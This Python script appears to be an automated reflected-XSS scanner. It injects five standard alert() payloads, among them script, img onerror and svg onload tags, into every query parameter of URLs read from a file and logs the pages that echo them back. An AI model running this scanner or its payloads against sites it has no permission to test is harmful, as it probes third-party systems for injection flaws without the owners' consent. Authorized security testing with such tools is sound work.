import aiohttp
import asyncio
import urllib.parse
from colorama import init, Fore

init()

rd = Fore.RED
g = Fore.GREEN
reset = Fore.RESET

payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
]

found_urls = []
sem = asyncio.Semaphore(50)

async def fetch(session, url, payload):
    url = url.strip()
    url_parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qsl(url_parsed.query)

    if not qs:
        return

    injected_qs = [(k, payload) for k, _ in qs]
    new_query = urllib.parse.urlencode(injected_qs)
    full_url = urllib.parse.urlunparse(url_parsed._replace(query=new_query))

    headers = {'User-Agent': "Mozilla/5.0"}

    async with sem:
        try:
            async with session.get(full_url, headers=headers, timeout=10) as response:
                text = await response.text()
                if payload in text:
                    print(f"{rd}[XSS FOUND] {full_url}{reset}")
                    found_urls.append(full_url)
        except Exception:
            pass

async def main(file):
    with open(file, 'r') as f:
        urls = f.readlines()

    async with aiohttp.ClientSession() as session:
        tasks = []
        for url in urls:
            for payload in payloads:
                tasks.append(fetch(session, url, payload))
        await asyncio.gather(*tasks)

    print(f"{g}\nScan complete. XSS Found: {len(found_urls)}{reset}")
    if found_urls:
        with open('xss_evillight.txt', 'w') as f:
            for url in found_urls:
                f.write(url + "\n")